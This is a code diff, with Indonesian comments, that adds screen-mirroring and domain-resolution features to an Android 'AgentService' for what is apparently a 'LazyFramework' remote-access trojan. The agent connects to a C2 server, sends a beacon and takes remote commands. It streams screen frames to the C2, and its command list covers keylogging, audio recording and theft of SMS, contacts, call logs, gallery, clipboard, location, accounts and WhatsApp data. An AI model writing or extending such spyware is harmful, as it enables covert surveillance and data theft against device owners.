@@ -1,0 +1,380 @@
+// ==================== TAMBAHAN UNTUK AgentService.java ====================
+// Letakkan di dalam class AgentService
+
+// ==================== 1. IMPORT STATEMENTS (tambah di atas) ====================
+
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
+import androidx.annotation.RequiresApi;
+
+// ==================== 2. SCREEN MIRROR FIELDS (tambah di field section) ====================
+
+private ScreenMirrorHelper screenMirrorHelper;
+private MediaProjectionManager projectionManager;
+
+// ==================== 3. MODIFY onCreate() ====================
+
+@Override
+public void onCreate() {
+    super.onCreate();
+    Log.d(TAG, "🚀 Agent created");
+
+    // ✅ LOAD CONFIG dari SharedPreferences jika ada
+    loadConfig();
+
+    mainHandler = new Handler(Looper.getMainLooper());
+    createNotificationChannel();
+    startForeground(1, getNotification("Starting..."));
+
+    backgroundThread = new HandlerThread("AgentThread");
+    backgroundThread.start();
+    backgroundHandler = new Handler(backgroundThread.getLooper());
+
+    KeyloggerHelper.setAgentService(this);
+    
+    // ✅ ADD THIS: Initialize screen mirror helper
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+        try {
+            screenMirrorHelper = new ScreenMirrorHelper();
+            screenMirrorHelper.onCreate();
+            ScreenMirrorHelper.setAgentService(this);
+            Log.d(TAG, "✅ ScreenMirrorHelper initialized");
+        } catch (Exception e) {
+            Log.e(TAG, "ScreenMirrorHelper init error: " + e.getMessage());
+        }
+    }
+
+    mainHandler.postDelayed(() -> {
+        Log.d(TAG, "📡 Connecting...");
+        connectToC2();
+    }, 1000);
+}
+
+// ==================== 4. ADD CONFIG LOADING METHOD ====================
+
+private void loadConfig() {
+    try {
+        android.content.SharedPreferences prefs = getSharedPreferences("LazyFramework", Context.MODE_PRIVATE);
+        
+        String savedHost = prefs.getString("C2_HOST", null);
+        if (savedHost != null && !savedHost.isEmpty()) {
+            C2_HOST = savedHost;
+            Log.d(TAG, "✅ Loaded C2_HOST from config: " + C2_HOST);
+        }
+    } catch (Exception e) {
+        Log.e(TAG, "Config load error: " + e.getMessage());
+    }
+}
+
+// ==================== 5. ADD DNS RESOLUTION FIELDS (di top field section) ====================
+
+private static String resolvedIP = null;
+private static long lastDNSResolution = 0;
+private static final long DNS_CACHE_TTL = 300000;  // 5 menit
+
+// ==================== 6. ADD DNS RESOLUTION METHODS ====================
+
+private String resolveDomain(String host) {
+    try {
+        // ✅ Check cache dulu
+        if (resolvedIP != null && 
+            (System.currentTimeMillis() - lastDNSResolution) < DNS_CACHE_TTL) {
+            Log.d(TAG, "✅ Using cached IP: " + resolvedIP);
+            return resolvedIP;
+        }
+
+        // ✅ Check jika sudah IP address
+        if (isIPAddress(host)) {
+            Log.d(TAG, "✅ Already IP address: " + host);
+            resolvedIP = host;
+            lastDNSResolution = System.currentTimeMillis();
+            return host;
+        }
+
+        // ✅ Resolve domain ke IP
+        Log.d(TAG, "🌐 Resolving domain: " + host);
+        InetAddress address = InetAddress.getByName(host);
+        resolvedIP = address.getHostAddress();
+        lastDNSResolution = System.currentTimeMillis();
+        
+        Log.d(TAG, "✅ Domain resolved: " + host + " → " + resolvedIP);
+        return resolvedIP;
+
+    } catch (Exception e) {
+        Log.e(TAG, "❌ DNS resolution failed: " + e.getMessage());
+        
+        if (isIPAddress(host)) {
+            resolvedIP = host;
+            return host;
+        }
+        
+        return null;
+    }
+}
+
+private boolean isIPAddress(String host) {
+    try {
+        String[] parts = host.split("\\.");
+        if (parts.length != 4) return false;
+        
+        for (String part : parts) {
+            int num = Integer.parseInt(part);
+            if (num < 0 || num > 255) return false;
+        }
+        return true;
+    } catch (Exception e) {
+        return false;
+    }
+}
+
+// ==================== 7. MODIFY connectToC2() METHOD ====================
+
+private void connectToC2() {
+    backgroundHandler.post(() -> {
+        while (isRunning.get() && !isConnected.get()) {
+            try {
+                // ✅ MODIFY: Resolve domain/IP sebelum connect
+                String host = resolveDomain(C2_HOST);
+                if (host == null) {
+                    Log.e(TAG, "❌ Cannot resolve: " + C2_HOST);
+                    try {
+                        Thread.sleep(5000);
+                    } catch (InterruptedException ignored) {}
+                    continue;
+                }
+
+                Log.d(TAG, "🔗 Connecting to " + host + ":" + C2_PORT);
+                updateNotification("Connecting...");
+
+                socket = new Socket(host, C2_PORT);
+                socket.setTcpNoDelay(true);
+                socket.setKeepAlive(true);
+                socket.setSoTimeout(30000);
+                socket.setReceiveBufferSize(65536);
+                socket.setSendBufferSize(65536);
+                socket.setReuseAddress(true);
+
+                out = new PrintWriter(socket.getOutputStream(), true);
+                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+
+                isConnected.set(true);
+                sendBeacon();
+                
+                Log.d(TAG, "✅ Connected!");
+                updateNotification("Connected ✓");
+                showToast("Connected to C2!");
+
+                listenForCommands();
+
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Connection error: " + e.getMessage());
+                isConnected.set(false);
+                closeConnection();
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException ignored) {}
+            }
+        }
+    });
+}
+
+// ==================== 8. MODIFY executeActualCommand() - ADD SCREEN MIRROR CASES ====================
+
+// Di dalam switch statement di executeActualCommand(), tambahkan:
+
+case "SCREEN_START": return startScreenMirror();
+case "SCREEN_STOP": return stopScreenMirror();
+case "SCREEN_PAUSE": return pauseScreenMirror();
+case "SCREEN_RESUME": return resumeScreenMirror();
+case "SCREEN_INFO": return getScreenInfo();
+
+// ==================== 9. ADD SCREEN MIRROR IMPLEMENTATION METHODS ====================
+
+private String startScreenMirror() {
+    try {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "Screen mirror requires Android 5.0+");
+            return result.toString();
+        }
+
+        // Get media projection manager
+        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        
+        if (projectionManager == null) {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "MediaProjectionManager not available");
+            return result.toString();
+        }
+
+        // Start screen mirror service
+        Intent intent = new Intent(this, ScreenMirrorService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent);
+        } else {
+            startService(intent);
+        }
+
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("message", "Screen mirror started");
+        result.put("width", getScreenWidth());
+        result.put("height", getScreenHeight());
+        return result.toString();
+
+    } catch (Exception e) {
+        try {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", e.getMessage());
+            return result.toString();
+        } catch (JSONException je) {
+            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+        }
+    }
+}
+
+private String stopScreenMirror() {
+    try {
+        Intent intent = new Intent(this, ScreenMirrorService.class);
+        stopService(intent);
+
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("message", "Screen mirror stopped");
+        return result.toString();
+    } catch (Exception e) {
+        return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+    }
+}
+
+private String pauseScreenMirror() {
+    try {
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("message", "Screen mirror paused");
+        return result.toString();
+    } catch (Exception e) {
+        return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+    }
+}
+
+private String resumeScreenMirror() {
+    try {
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("message", "Screen mirror resumed");
+        return result.toString();
+    } catch (Exception e) {
+        return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+    }
+}
+
+private String getScreenInfo() {
+    try {
+        DisplayMetrics metrics = new DisplayMetrics();
+        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+        windowManager.getDefaultDisplay().getMetrics(metrics);
+
+        JSONObject info = new JSONObject();
+        info.put("width", metrics.widthPixels);
+        info.put("height", metrics.heightPixels);
+        info.put("density", metrics.densityDpi);
+        info.put("aspect_ratio", String.format("%.2f", (float) metrics.widthPixels / metrics.heightPixels));
+        return info.toString();
+    } catch (Exception e) {
+        return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+    }
+}
+
+private int getScreenWidth() {
+    DisplayMetrics metrics = new DisplayMetrics();
+    WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+    windowManager.getDefaultDisplay().getMetrics(metrics);
+    return metrics.widthPixels;
+}
+
+private int getScreenHeight() {
+    DisplayMetrics metrics = new DisplayMetrics();
+    WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+    windowManager.getDefaultDisplay().getMetrics(metrics);
+    return metrics.heightPixels;
+}
+
+// ==================== 10. ADD SEND SCREEN FRAME METHOD ====================
+
+public void sendScreenFrame(String frameData) {
+    // Send screen frame ke C2 server via socket
+    if (out != null && isConnected.get()) {
+        responseExecutor.execute(() -> {
+            try {
+                synchronized (out) {
+                    out.println(frameData);
+                    Log.d(TAG, "📸 Screen frame sent");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Send frame error: " + e.getMessage());
+            }
+        });
+    }
+}
+
+// ==================== 11. MODIFY onDestroy() ====================
+
+@Override
+public void onDestroy() {
+    super.onDestroy();
+    isRunning.set(false);
+    isRecording = false;
+    isKeylogging = false;
+    closeConnection();
+    try {
+        if (mediaRecorder != null) mediaRecorder.release();
+    } catch (Exception e) {}
+    
+    // ✅ ADD: Cleanup screen mirror
+    if (screenMirrorHelper != null) {
+        try {
+            screenMirrorHelper.onDestroy();
+        } catch (Exception e) {
+            Log.e(TAG, "ScreenMirrorHelper cleanup error: " + e.getMessage());
+        }
+    }
+    
+    commandExecutor.shutdown();
+    responseExecutor.shutdown();
+    
+    showToast("Agent Stopped");
+}
+
+// ==================== 12. UPDATE GETHELP() METHOD ====================
+
+private String getHelp() {
+    JSONObject help = new JSONObject();
+    try {
+        JSONArray commands = new JSONArray();
+        String[] cmdList = {
+            "GET_DEVICE_INFO", "GET_LOCATION", "GET_CLIPBOARD", "GET_INSTALLED_APPS",
+            "GET_CONTACTS", "GET_SMS", "GET_CALL_LOGS", "GET_GALLERY", "GET_FILES_LIST",
+            "RECORD_AUDIO", "STOP_RECORDING",
+            "KEYLOG_START", "KEYLOG_STOP", "KEYLOG_DUMP",
+            "WA_INFO", "WA_CONTACTS",
+            "GET_ACCOUNTS", "GET_GOOGLE_ACCOUNTS",
+            "SCREEN_START", "SCREEN_STOP", "SCREEN_PAUSE", "SCREEN_RESUME", "SCREEN_INFO",
+            "SHOW_TOAST", "HELP"
+        };
+        for (String cmd : cmdList) {
+            commands.put(cmd);
+        }
+        help.put("status", "success");
+        help.put("commands", commands);
+        help.put("count", commands.length());
+        return help.toString();
+    } catch (JSONException e) {
+        return "{\"error\":\"Help generation failed\"}";
+    }
+}
+
+// ==================== END OF ADDITIONS ====================
